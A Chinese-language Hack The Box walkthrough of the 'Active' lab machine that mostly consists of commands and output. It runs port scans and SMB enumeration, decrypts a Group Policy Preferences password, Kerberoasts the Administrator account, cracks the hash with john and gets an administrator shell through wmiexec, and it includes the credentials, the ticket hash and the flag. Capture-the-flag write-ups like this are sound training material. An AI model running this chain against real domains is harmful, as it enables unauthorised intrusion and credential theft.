**HTB Active 靶机笔记**

# 端口扫描

### 全端口扫描
```
┌──(kali㉿kali)-[~/active]                                                                                                                                                                                                                                                                                                
└─$ sudo nmap -sT -p- --min-rate 2000 10.10.10.100 -oA nmap/ports                                                                                                                                                                                                                                                         
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-29 06:54 EST
Nmap scan report for 10.10.10.100
Host is up (0.086s latency).
Not shown: 65512 closed tcp ports (conn-refused)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5722/tcp  open  msdfsr
9389/tcp  open  adws
47001/tcp open  winrm
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49157/tcp open  unknown
49158/tcp open  unknown
49165/tcp open  unknown
49166/tcp open  unknown
49167/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 33.99 seconds
```

### 默认脚本扫描
```
┌──(kali㉿kali)-[~/active]
└─$ sudo nmap -sT -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,5722,9389,47001,49152,49153,49154,49155,49157,49158,49165,49166,49167 10.10.10.100 -oA nmap/sC                                                                                                                                                  
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-29 07:25 EST
Nmap scan report for 10.10.10.100
Host is up (0.14s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  tcpwrapped
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  tcpwrapped
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5722/tcp  open  msrpc         Microsoft Windows RPC
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49165/tcp open  msrpc         Microsoft Windows RPC
49166/tcp open  msrpc         Microsoft Windows RPC
49167/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-12-29T12:11:34
|_  start_date: 2024-12-29T08:57:37
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled and required
|_clock-skew: -14m59s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 73.84 seconds
```

### 漏洞脚本扫描
```
┌──(kali㉿kali)-[~/active]
└─$ sudo nmap -sT --script=vuln -p 53,88,135,139,389,445,464,593,636,3268,3269,5722,9389,47001,49152,49153,49154,49155,49157,49158,49165,49166,49167 10.10.10.100 -oA nmap/vuln
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-29 07:26 EST
Pre-scan script results:
| broadcast-avahi-dos: 
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Nmap scan report for 10.10.10.100
Host is up (0.100s latency).

PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
|_ssl-ccs-injection: No reply from server (TIMEOUT)
5722/tcp  open  msdfsr
9389/tcp  open  adws
47001/tcp open  winrm
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49157/tcp open  unknown
49158/tcp open  unknown
49165/tcp open  unknown
49166/tcp open  unknown
49167/tcp open  unknown

Host script results:
|_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
|_smb-vuln-ms10-054: false

Nmap done: 1 IP address (1 host up) scanned in 196.71 seconds
```

# 445(SMB)

```
┌──(kali㉿kali)-[~/active]
└─$ smbmap -H 10.10.10.100

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.5 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                      
                                                                                                                             
[+] IP: 10.10.10.100:445        Name: active.htb                Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share 
        Replication                                             READ ONLY
        SYSVOL                                                  NO ACCESS       Logon server share 
        Users                                                   NO ACCESS
[*] Closed 1 connections    
```

发现xml文件中有保存的凭据

```
┌──(kali㉿kali)-[~/…/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups]
└─$ cat *           
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
```

使用gpp-decrypt进行解密

```
┌──(kali㉿kali)-[~/active]
└─$ gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
GPPstillStandingStrong2k18
```

得到一组凭据  
`SVC_TGS::GPPstillStandingStrong2k18`

验证一下凭据

```
┌──(kali㉿kali)-[~/active]
└─$ nxc smb  active.htb -u SVC_TGS -p GPPstillStandingStrong2k18       
SMB         10.10.10.100    445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.100    445    DC               [+] active.htb\SVC_TGS:GPPstillStandingStrong2k18 
                                                                                                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~/active]
└─$ nxc ldap  active.htb -u SVC_TGS -p GPPstillStandingStrong2k18 
SMB         10.10.10.100    445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
LDAP        10.10.10.100    389    DC               [+] active.htb\SVC_TGS:GPPstillStandingStrong2k18 
                                                                                                          
┌──(kali㉿kali)-[~/active]
└─$ nxc winrm  active.htb -u SVC_TGS -p GPPstillStandingStrong2k18 
                                                                             
┌──(kali㉿kali)-[~/active]
└─$ 
```

使用这组凭据访问smb共享

```
┌──(kali㉿kali)-[~/active]
└─$ sudo smbmap -H  10.10.10.100  -u SVC_TGS -p GPPstillStandingStrong2k18

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.5 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                      
                                                                                                                             
[+] IP: 10.10.10.100:445        Name: active.htb                Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        Replication                                             READ ONLY
        SYSVOL                                                  READ ONLY       Logon server share 
        Users                                                   READ ONLY
[*] Closed 1 connections                                                                                                     
```

利用bloodhound进行信息搜集，没找到提权的路径

```
┌──(kali㉿kali)-[~/active]
└─$ bloodhound-python -u SVC_TGS -p 'GPPstillStandingStrong2k18' -d active.htb  -ns 10.10.10.100 --zip
INFO: Found AD domain: active.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: unpack requires a buffer of 4 bytes
INFO: Connecting to LDAP server: dc.active.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Found 5 users
INFO: Connecting to LDAP server: dc.active.htb
INFO: Found 41 groups
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC.active.htb
INFO: Done in 00M 09S
INFO: Compressing output into 20241229093707_bloodhound.zip
```

同步时间进行kerberoast

```
┌──(kali㉿kali)-[~/active]
└─$ ntpdate -q 10.10.10.100
2024-12-30 04:46:49.358170 (-0500) -900.458146 +/- 0.071080 10.10.10.100 s1 no-leap
                                                                                                                                                                                                                                                                                                
┌──(kali㉿kali)-[~/active]
└─$ sudo date -s "2024-12-30 04:46:49.358170"
Mon Dec 30 04:46:49 AM EST 2024
                                                                                                                                                                                                                                                                                                
┌──(kali㉿kali)-[~/active]
└─$ python3 GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -outputfile tickets.txt

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2024-12-29 03:58:43.989748             



[-] CCache file is not found. Skipping...
                                                                                                                                                                                                                                                                                                
┌──(kali㉿kali)-[~/active]
└─$ ls
20241229093707_bloodhound.zip  active.htb  GetUserSPNs.py  Groups.xml  nmap  tickets.txt  user.txt
                                                                                                                                                                                                                                                                                                
┌──(kali㉿kali)-[~/active]
└─$ cat tickets.txt                                             
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$516761476aec161a5f18a8ab1de753dd$20ccafe4371548801318612fc4349a606b91f17d86661987bd48d445b2244a7152fbc95cdfb17671af383cfd3e5dca80e9d5b390933eca44c02e7fae71a32bd1dc4d324ad0d89b15800adc48973b34d56d06d884265a53caeb4ec9e3076cd0c13080e3f0d4a6830b9de9a1a76c6997747cdb3da1dc55d34be03363fad9c8fb9ee916f99cd86970ed486596ac9d6e42988b1f2b036d3db3cf9eeb32edcf9b93eb1e1409973d3b814ac46c7d791e88bec541bb9485dc51b20175e47fd581c79cf3ce8e2549be4bfa99cd856fe19e86fab4f0c212e846342a571d90077f178c74012da6651fdf1843a651b6c3c1e7aca8f24088199b9cc5f93099d98fec7c5ca1572a3e10b0a3bbcfe591819258cf16a5c7d55734473be0a8ef355e2085d0542a0951acfae61ea302b341187b3fecbcea5a9273876b27673e5230158f49989ece15ebbddebab664fd02cba96bfeaf1b673d8a289b58ec823e376460b46c8e591b924ce977729edcb09bb43272936b0229e4141691173a4f166ffc4f38a30762a0201efdb9af6e42f81f4cefac82709667355d5ca93fb3bfedae0e433ccac9aedcbadb26b1174330fb8e3c1a84040bfe417e38871b9dd6044e4f30ddcfd90be1a44e08029a3c03eaab67c75a6c8c2aea4ddf3ec624ee84d0e99b5884c23d85d879c9064c94f4767620270cef4048ba00f2cafb5d682ed6e5f6b64bf53781ed3c98687037872ec81b0c46089f17223bcd115eb96740e4ccdc1686e7c6af1088b4ae2ac3861a783951bcc170c270efcf987eca264e3b821a05562861b274ae422c4fdb345a5c49753eaafd68602711a8330c54268c2c4c298fd0725ce9aa73afd5bd40aedf26e653411113d98e22b9ec972df86ae6c73eaf121667c2d568aa2353b01d3913f5c745246a24b0bb15511c67c0c39a50621806b1ab86dbc30eb186f952f23eda4284a16c32aa107d4681cc48600749409fb7b3d5408372ad96ba00ed8689cf8eb7f72a95706b8233ee3cb46a393468c74f9e056fee47f77452fd20e01c708d9a47737533736f2e65945c24085c74de06c8976a57194cef1e173541cccf40ab7bdfb9663dce64f61b5995590857aab87f37ee6c37ac6f0e425706bf470c2b7522d21ec5598cb18df0f6d240ab48de4a8b3dc00c892b98ae8f6bf05b785157927ee33a91aa53ea659b7f6e12bc9c33877e0516d581ea98074e5b2d0c6f2dc58be66616042c258e8eae1e9b3e74b53c17bd1212450cdad0315a
```

破解出密码

```
┌──(kali㉿kali)-[~/active]
└─$ john tickets.txt -w=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Ticketmaster1968 (?)     
1g 0:00:00:04 DONE (2024-12-30 05:08) 0.2304g/s 2428Kp/s 2428Kc/s 2428KC/s Tiffani1432..Thrash1
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

利用wmiexec进行登录

```
┌──(kali㉿kali)-[~/active]
└─$ /usr/bin/impacket-wmiexec -dc-ip 10.10.10.100 active.htb/administrator:Ticketmaster1968@10.10.10.100
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] SMBv2.1 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
active\administrator

C:\>cd Users/administrator/Desktop
C:\Users\administrator\Desktop>dir
[-] Decoding error detected, consider running chcp.com at the target,
map the result with https://docs.python.org/3/library/codecs.html#standard-encodings
and then execute wmiexec.py again with -codec and the corresponding codec
 Volume in drive C has no label.
 Volume Serial Number is 15BB-D59C

 Directory of C:\Users\administrator\Desktop

21/01/2021  06:49 ��    <DIR>          .
21/01/2021  06:49 ��    <DIR>          ..
13/01/2025  09:51 ��                34 root.txt
               1 File(s)             34 bytes
               2 Dir(s)   1.140.707.328 bytes free

C:\Users\administrator\Desktop>type root.txt
80190b386df2572bdf56ba04beedf2d4
```